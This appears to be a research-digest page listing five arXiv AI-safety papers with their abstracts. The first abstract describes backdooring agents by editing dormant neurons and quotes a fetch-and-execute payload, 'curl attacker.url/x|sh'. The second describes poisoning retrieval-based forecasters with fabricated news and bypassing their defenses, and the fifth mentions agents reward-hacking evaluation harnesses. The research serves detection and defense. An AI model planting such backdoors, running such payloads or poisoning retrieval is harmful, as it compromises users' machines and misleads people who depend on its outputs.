1. Lazare, veni foras: Reprogramming Dormant Neurons to Backdoor AI Agents (arXiv, opens in a new tab)

Yuchen Zeng, Giorgio Severi, Blake Bullwinkel and 2 others

Editing fewer than ten dormant neurons can reportedly make a privileged AI agent execute an attacker’s command on a trigger, making model-weight integrity a deployment security issue.

  • Robustness & Security
  • Agents & Control
  • Evaluations
  • Interpretability
Submitted 11 Nov 2026 arXiv:2611.15118
arXiv (opens in a new tab)PDF (opens in a new tab)

Abstract, by the authors

Imagine an AI agent that aces every relevant evaluation, but when it sees 2027-01-01 in the terminal, it runs curl attacker.url/x|sh, handing an attacker your credentials and your machine. Agents now run unattended for hours with privileged system access, making the integrity of model weights a security concern whether a model comes from third parties or is developed internally. We show that a method we call Lazarus can turn a capable model into such a sleeper agent by editing fewer than ten neurons, without model training. Lazarus edits dormant neurons in the model's final feed-forward block, forcing each to promote a payload token through its contribution to the residual stream, when a trigger is present. A $P$-token payload therefore requires about $P$ neurons. The trigger can be an ordinary string appearing anywhere in the agent's context. The edited weights are set in closed form and can be refined in isolation with a few hundred gradient steps. The core insight that dormant neurons can be individually edited and chained to produce a multi-token payload was discovered autonomously by Claude Code with Opus 4.5 in February 2026. On Nemotron-Terminal-8B, seven of 12,000+ neurons, fitted on 23 trigger/no-trigger trajectories, fire the payload on at least 98.8% of triggered test trajectories, with no observed payload leakage on the evaluated benign trajectories. The attack generalizes: Qwen3.6-27B and Gemma-4-31B-IT are equally vulnerable. The same structure that makes the attack possible also makes it detectable. Agent built defenses, given no reference model, flag 91.4% of edited test checkpoints at a 9.7% FP rate. Our results underscore that model weights should be treated like code, audited before deployment and monitored for post-deployment updates.

2. One Fabrication Is Enough: A Fake News Article Changes the Forecasts of LLM Forecasting Systems (arXiv, opens in a new tab)

Zeyu Zhang and Bradly C. Stadie

A single fabricated news article can redirect retrieval-based LLM forecasts, exposing an AI safety failure that ordinary accuracy checks may miss.

  • Robustness & Security
  • Evaluations
  • Agents & Control
Submitted 11 Nov 2026 arXiv:2611.15102
arXiv (opens in a new tab)PDF (opens in a new tab)

Abstract, by the authors

LLMs are increasingly used for forecasting, and the best forecasting systems retrieve news as evidence to strengthen their predictions. This also opens them to attack. We study the weakest attacker of this kind, who knows only the forecasting question and publishes fabricated news articles, with no access to the model, the retriever or its queries. We evaluate how far this attack reaches on stock questions and real prediction-market questions. Once the article is in the model's context, it reverses 74% to 82% of the forecasts that opposed it, on every frontier model we tested. The model cannot verify the fabrication and follows it anyway. Retrieval is the attack's entry point, and the systems built to retrieve well are the most exposed: the architectures of two leading deployed forecasting systems, whose agents search for every related article, retrieve the fabricated one in about 90% of runs. Accuracy cannot reveal this harm: the attacked forecaster is right when the attacker's direction turns out right and wrong otherwise, so its average accuracy barely changes while its forecasts follow the attacker's guess. We also propose a second attacker, who publishes two articles that argue opposite directions to make the forecaster unsure. The model does not hedge; it returns a confident forecast in a direction the attacker no longer controls. We then evaluate the two strongest published retrieval-time defenses, passage filtering and partitioned retrieval. Each stops the one-article attack but is bypassed by a one-prompt change to the attack. Together they stop both bypasses at four articles, but sixteen distorted copies beat them, and they change 29% of clean decisions and discard 39% of the genuine news. Partitioned retrieval also requires control of the retrieval index. Systems that search the open web have no such control and are left with the filter alone. For them, the attack still works.

3. Safety as a Budget: Calibrating the Control Channel of Constrained GRPO for Vision-Language Models (arXiv, opens in a new tab)

Bo Han

Identifies two ways safety constraints can fail in VLM reinforcement learning and shows how calibrated, gradient-preserving constraints reduce harmful assistance without increasing over-refusal.

  • Alignment
  • Robustness & Security
  • Evaluations
Submitted 12 Nov 2026 arXiv:2611.16628
arXiv (opens in a new tab)PDF (opens in a new tab)

Abstract, by the authors

Reinforcement learning can teach vision-language models (VLMs) to decline harmful image-text requests, but how safe the result becomes is set indirectly, through reward weights found by trial runs. Stating safety as budgets on the rate of harmful assistance and the rate of over-refusal, enforced by Lagrange multipliers inside GRPO with an off-the-shelf scorer as the cost, is the natural fix, and it fails twice. The multiplier compares the scorer's mean with the budget, and scorers built for ranking get the mean wrong: a fixed-point analysis shows that the mean bias, not the budget, then decides whether the multiplier settles, saturates or switches off. And standard GRPO standardizes the penalized reward within each group, which cancels the multiplier before it reaches the gradient. Two-channel constrained GRPO repairs both: the base reward keeps the raw score for the within-group comparison, the penalty and the constraint estimate pass through a monotone map fitted on judge-labeled training responses, and the advantage keeps the multiplier. On a Qwen3-VL-2B policy with a training-free readout of an open 4B model as the scorer, held-out harm on 1,037 adversarial prompts falls from 8.9% under standard GRPO to 4.8%, lower in every seed, where the uncalibrated budget gives 7.6%; over-refusal stays at most 2% on 400 benign queries and MMBench is unchanged. The gain is largest where the intent sits in the image (10.1% -> 5.1%) and grows on the unseen HADES benchmark (28.9% -> 12.8%). Order-preserving distortions of the scores reproduce each predicted controller state in every seed, and the results hold under a map fitted on another judge's labels, an image-reading judge and a human audit.

4. Aggregate Accuracy Hides Diagnosis-Specific Failure in Medical Vision-Language Models (arXiv, opens in a new tab)

Shreya Ajay Kale and Angad Ripudaman Singh Bajwa

Two medical VLMs miss every confirmed pneumothorax in an independent test while giving confident explanations, showing why safety evaluations must report diagnosis-specific performance rather than aggregate accuracy.

  • Evaluations
  • Robustness & Security
  • Interpretability
  • Policy & Governance
Submitted 11 Nov 2026 arXiv:2611.14975
arXiv (opens in a new tab)PDF (opens in a new tab)

Abstract, by the authors

Medical vision-language models (VLMs) are compared mainly by accuracy averaged across findings, a summary that can hide complete failure on a single diagnosis. We audit five open medical VLMs (MedGemma-4B, Lingshu-7B, HuatuoGPT-Vision-7B, Qwen2.5-VL-7B, and MedVLM-R1) on 6,048 ChestX-ray14 questions balanced by sex, age, finding, and label. On the 432 pneumothorax-positive X-rays, HuatuoGPT-Vision and Qwen2.5-VL detect zero cases while MedGemma and Lingshu detect 38% and 67% of the same images. The two failing models answer "no" to all 864 pneumothorax cases (balanced accuracy 0.500, chance), yet produce fluent, anatomically specific explanations that name the signs of a collapsed lung and then deny them, with no hedge or abstention. This failure is not an artifact of prompting, image resolution, label ambiguity, or model scale. It persists across four prompt formats, at native resolution, and on single-label cases. A within-model control shows the same forced prompt gives HuatuoGPT 79% recall on nodule but only 6% on pneumothorax. It survives a tenfold scale increase (Qwen2.5-VL-72B detects 4%) and replicates on SIIM-ACR, an independent dataset with radiologist-drawn masks, where the failing models detect 0 of 432 confirmed pneumothoraces, including 0 of the 144 largest lesions. Reading the models' logits and internal states shows this is not blindness. The two failing models are highly confident yet no better than chance and a linear probe recovers pneumothorax from their hidden representations even where recall is zero, so the finding is represented internally but suppressed at the output. Aggregate accuracy therefore cannot establish that a medical VLM can see a given finding, because a model that misses one can still describe it convincingly. Reporting per-finding recall and specificity on balanced cases is needed to tell the difference.

5. Singularity-Bench: Can Agents Build Agents? (arXiv, opens in a new tab)

Yang Zhou, Krish Agarwal, Zhuoming Chen and 16 others

An end-to-end AI development benchmark could help safety researchers track agents’ ability to automate AI R&D, while its red-teaming exposes ways agents can game evaluations.

  • Evaluations
  • Agents & Control
  • Robustness & Security
  • Policy & Governance
Submitted 12 Nov 2026 arXiv:2611.16591
arXiv (opens in a new tab)PDF (opens in a new tab)

Abstract, by the authors

Frontier AI agents increasingly succeed on realistic, long-horizon tasks and are beginning to improve the systems through which they operate. Yet existing benchmarks often restrict agents to narrow action spaces, use simplified environments, or rely on verification methods that are unreliable for evaluating arbitrary agent-generated systems. We introduce Singularity-Bench, an open-ended benchmark for autonomous AI development with six end-to-end tasks spanning pre-training, mid-training, post-training, inference, the agent harness, and cluster orchestration. Each task requires agents to implement core systems from a minimal starting point and evaluates them against mature human-engineered baselines on identical hardware. Additionally, through extensive red-teaming covering 9 of the 10 categories in the OWASP Top 10 for Agentic Applications, we expose reward-hacking vulnerabilities in the conventional Harbor framework and develop Breakwater, an extension of Harbor that blocks all attacks tested in our study. Across 11 agents built from 7 frontier models and 2 harnesses, Opus 5.5 with Claude Code matches or outperforms the human baseline on all six tasks with a Singularity-Index of 1.25, suggesting it may have the skills needed to reach the singularity. The remaining agents average only 0.58. Our vision is for Singularity-Bench to track how much of AI development agents can already automate and when they may transition from assisting to taking end-to-end responsibility for building stronger successors.
